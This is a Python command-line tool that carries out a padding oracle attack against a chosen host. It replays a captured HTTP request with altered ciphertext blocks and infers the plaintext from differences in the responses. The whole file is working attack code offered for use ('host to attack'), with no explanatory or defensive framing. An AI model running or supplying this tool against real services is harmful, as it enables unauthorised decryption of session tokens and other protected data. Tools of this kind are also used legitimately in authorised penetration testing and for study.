#!/usr/bin/env python
# encoding: utf-8

import argparse
import socket
import ssl
import logging
import os
from binascii import a2b_hex, a2b_base64, b2a_hex, b2a_base64
from urllib.parse import urlparse, unquote_to_bytes, quote_plus
from collections import defaultdict
import time
import re

from helperlib.logging import default_config
from helperlib.exception import install_hook
from helperlib import terminal, prompt

TERM = terminal.TerminalController()


log = logging.getLogger(__name__)


def get_encoder(enc):
    if enc == 'base64':
        return b2a_base64
    elif enc == 'url':
        return lambda x: quote_plus(x).encode('utf-8')
    elif enc in ('lower_hex', 'hex'):
        return b2a_hex
    elif enc == 'upper_hex':
        return lambda x: b2a_hex(x).upper()


def get_decoder(enc):
    if enc == 'base64':
        return a2b_base64
    elif enc == 'url':
        return lambda x: unquote_to_bytes(x.replace(b'+', b'%20'))
    elif enc in ('lower_hex', 'upper_hex', 'hex'):
        return a2b_hex


def padding_oracle(orig_payload, block_size, limit=None, callback=None):
    orig_payload = orig_payload
    blocks = len(orig_payload) // block_size
    block = blocks - 1
    positions = 0

    while block >= 0:
        current_block = orig_payload[block*block_size:(block+1)*block_size]
        position = block_size - 1
        postfix = b''
        while position >= 0:
            padding = bytearray(block_size-len(postfix)) + postfix
            value = 0
            while value < 256:
                padding[position] = value
                yield padding + current_block
                if callback:
                    postfix = callback(block, position, value)
                    if postfix is not None:
                        log.debug("New postfix: %s", postfix)
                        break
                value += 1
            if value == 256 and postfix is None:
                raise RuntimeError('Can\'t decrypt byte %d in block %d' % (position, block))
            position -= 1
            positions += 1
            if limit and limit <= positions:
                return
        block -= 1


def response(s):
    header = b''
    r_found = 0
    n_found = 0
    while True:
        c = s.recv(1)
        header += c
        if c == b'\r':
            r_found += 1
        elif c == b'\n':
            n_found += 1
        else:
            r_found = n_found = 0
        if not c or (r_found > 1 and n_found > 1):
            break

    log.debug('Header: %s', header)

    header = header.split(b'\r\n')
    status_line = header[0].split(b' ', 2)
    h = [
        h.split(b': ', 1) for h in header[1:] if h
    ]
    parsed_header = {
        'code': int(status_line[1]),
        'msg': status_line[2],
        'headers': defaultdict(list)
    }
    for k, v in h:
        parsed_header['headers'][k.lower()].append(v)

    log.debug('Header: %s', parsed_header)

    if b'content-length' in parsed_header['headers']:
        ln = int(parsed_header['headers'][b'content-length'][0])
        log.debug('Content-Length: %d', ln)
        body = s.recv(ln)
    else:
        body = None
    log.debug('Body: %s', body)
    return parsed_header, body


def request(target, template, use_ssl=False):
    env = 'https_proxy' if use_ssl else 'http_proxy'
    if env in os.environ:
        proxy = urlparse(os.environ[env])
        proxy = list(proxy.netloc.split(':'))
        if len(proxy) < 2:
            proxy.append(8080)
        log.debug('Use Proxy %s:%d', proxy[0], int(proxy[1]))
        s = socket.create_connection((proxy[0], int(proxy[1])))
        s.send(('CONNECT %s:%d HTTP/1.1\r\n' % target).encode())
        s.send(('Host %s:%d\r\n\r\n' % target).encode())
        resp = response(s)
    else:
        s = socket.create_connection(target)
    log.debug('Requesting tcp%s://%s:%s\n%s',
              ('+ssl' if args.ssl else ''), args.host, args.port, template)
    if args.ssl:
        s = ssl.wrap_socket(s)
    s.send(template)
    start = time.time()
    resp = response(s)
    end = time.time()
    resp = list(resp)
    resp.append(end-start)
    resp = tuple(resp)
    s.close()
    return resp


def run(target, template, use_ssl=False, marker=b'\xc2\xa7', encodings=[],
        blocksize=16, show_timings=False):
    if template.count(marker) != 2:
        raise ValueError('Marker has to be a pair')

    log.info('Test connection to tcp%s://%s:%s',
             ('+ssl' if args.ssl else ''), args.host, args.port)

    env = 'https_proxy' if use_ssl else 'http_proxy'
    if env in os.environ:
        proxy = urlparse(os.environ[env])
        proxy = list(proxy.netloc.split(':'))
        if len(proxy) < 2:
            proxy.append(8080)
        log.info('Use Proxy %s:%d', proxy[0], int(proxy[1]))
    base_response = request(target=target, template=template.replace(marker, b''), use_ssl=use_ssl)

    body_len = len(base_response[1]) if base_response[1] else 0
    log.info("Base Response:\tCode %d\t%d bytes\t%f s",
             base_response[0]['code'],
             body_len,
             base_response[2])

    encoder_chain = [
        get_encoder(e) for e in encodings
    ]
    decoder_chain = reversed([
        get_decoder(e) for e in encodings
    ])

    escaped_marker = re.escape(marker)
    orig_payload = re.search(escaped_marker + b'(.*?)' + escaped_marker, template).group(1)
    orig_len = len(orig_payload)
    log.debug('Original payload: %s', orig_payload)
    orig_payload_decoded = orig_payload
    for e in decoder_chain:
        orig_payload_decoded = e(orig_payload_decoded)
    log.debug('Decoded payload: %s', orig_payload_decoded)

    error_cond = collect_responses(orig_payload_decoded, orig_len, body_len,
                                   blocksize, encoder_chain, target, use_ssl,
                                   marker, template, show_timings)

    return decrypt(orig_payload_decoded, orig_len, body_len, blocksize,
                   encoder_chain, target, use_ssl, marker, template, error_cond)


def decrypt(orig_payload_decoded, orig_len, body_len, blocksize,
            encoder_chain, target, use_ssl, marker, template, error_cond):
    escaped_marker = re.escape(marker)
    resp = [None]

    im = []

    total_blocks = len(orig_payload_decoded) // blocksize
    log.info("Total blocks: %d", total_blocks)
    decrypted = [b'', [' '] * 2 * blocksize * total_blocks]
    decrypted_blocks = [0]
    last_msg = ['', '']

    progress = terminal.ProgressBar(TERM, 'Decrypting')

    def callback(block, position, value):
        postfix = None
        full_block = False
        if block > 0:
            prev_block = orig_payload_decoded[(block-1)*blocksize:block*blocksize]
        else:
            prev_block = bytes(blocksize)

        cim = (blocksize - position) ^ value
        c = cim ^ prev_block[position]
        decrypted[1][block*blocksize * 2 + position*2  ] = hex(c >> 4)[2:]
        decrypted[1][block*blocksize * 2 + position*2+1] = hex(c & 15)[2:]
        last_msg[0] = ''.join(decrypted[1])

        if not (resp[0][0]['code'] == error_cond[0] and len(resp[0][1]) == error_cond[1]):
            im.insert(0, cim)
            log.debug('Found 0x%02x %c @ %d,%d', c, c, block, position)

            decrypted[0] += bytes([c])

            #last_msg[1] = '0x%02x %c @ %d,%d' % (c, c, block, position)
            last_msg[1] = '0x%02x @ %2d,%2d' % (c, block, position)

            postfix = bytes([i ^ (blocksize - position + 1) for i in im])

            if len(decrypted[0]) % blocksize == 0:
                decrypted_blocks[0] = len(decrypted[0]) // blocksize
                im.clear()
                full_block = True
        percentage = 0
        if decrypted_blocks[0] > 0:
            percentage += decrypted_blocks[0] / total_blocks
        if not full_block:
            percentage += (1 - position / blocksize) / total_blocks
            percentage += value / 256 / blocksize / total_blocks
        progress.update(percentage, ' || '.join(last_msg))
        return postfix

    for payload in padding_oracle(orig_payload_decoded, blocksize, callback=callback):
        log.debug('Payload: %s', payload)
        for e in encoder_chain:
            payload = e(payload)
        log.debug('Encoded Payload: %s', payload)
        new_len = len(payload)
        tmp = re.sub(escaped_marker + b'.*?' + escaped_marker, payload, template)
        tmp = re.sub(b'(content-length:\s*)\d+',
                     '\1{0}'.format(body_len - orig_len + new_len).encode(), tmp, flags=re.I)
        resp[0] = request(target=target, template=tmp, use_ssl=use_ssl)

    return bytes(reversed(decrypted[0]))


def collect_responses(orig_payload_decoded, orig_len, body_len, blocksize,
                      encoder_chain, target, use_ssl, marker, template, show_timings):
    escaped_marker = re.escape(marker)
    log.info('Collecting responses...')

    responses = [('Code', 'Body Size', 'Resp time')]
    progress = terminal.ProgressBar(TERM, 'Collecting responses...')
    for payload in padding_oracle(orig_payload_decoded, blocksize, limit=1):
        log.debug('Payload: %s', payload)
        for e in encoder_chain:
            payload = e(payload)
        log.debug('Encoded Payload: %s', payload)
        new_len = len(payload)
        tmp = re.sub(escaped_marker + b'.*?' + escaped_marker, payload, template)
        tmp = re.sub(b'(content-length:\s*)\d+',
                     '\1{0}'.format(body_len - orig_len + new_len).encode(), tmp, flags=re.I)
        resp = request(target=target, template=tmp, use_ssl=use_ssl)
        progress.update(len(responses) / 256, '')
        responses.append((
            resp[0]['code'],
            len(resp[1]),
            resp[2]
        ))

    if show_timings:
        table = terminal.Table(TERM, responses, col_format='ccc', seperator=' | ', borders=True)
        table.render()

    subset = [r[:2] for r in responses[1:]]
    merged = list(set(subset))
    merged = [
        [i, r[0], r[1], subset.count(r), ''] for i, r in enumerate(merged)
    ]
    log.info('%d different responses found', len(merged))
    if len(merged) > 1:
        m = max(merged, key=lambda x: x[3])
        log.info('Possible padding error: %s', m)
        merged[merged.index(m)][4] = '*****'
    table = terminal.Table(TERM,
                           [('#', 'Code', 'Body Size', 'Count', 'Possible Padding Error')] + merged,
                           col_format='lcccc', seperator=' | ', borders=True)
    table.render()

    if len(merged) < 2:
        raise IOError('Could not find different responses')

    return merged[int(prompt("Select error response"))][1:]


if __name__ == '__main__':
    install_hook()
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('TEMPLATE', type=argparse.FileType('rb'))
    parser.add_argument('-m', '--marker', default='§', help='marker for encrypted sample')
    parser.add_argument('-H', '--host', help='host to attack')
    parser.add_argument('-p', '--port', type=int, help='port to attack')
    parser.add_argument('-s', '--ssl', action='store_true', help='use ssl')
    parser.add_argument('-e', '--encoding', action='append',
                        choices=('base64', 'lower_hex', 'upper_hex', 'url'),
                        help='chain of encoders to use')
    parser.add_argument('-b', '--blocksize', default=16, type=int, help='blocksize to use')
    parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')

    args = parser.parse_args()

    if default_config:
        default_config(level='DEBUG' if args.verbose else 'INFO', disable_existing_loggers=False)
    else:
        logging.basicConfig(level='DEBUG' if args.verbose else 'INFO')

    decrypted = run(target=(args.host, args.port),
                    template=args.TEMPLATE.read(),
                    use_ssl=args.ssl,
                    marker=args.marker.encode('utf-8'),
                    encodings=args.encoding,
                    blocksize=args.blocksize)

    log.info("Decrypted: %s", decrypted)
    log.info("Decrypted (hex): %s", b2a_hex(decrypted).decode())
    log.info("Decrypted (raw): %s", decrypted.decode())
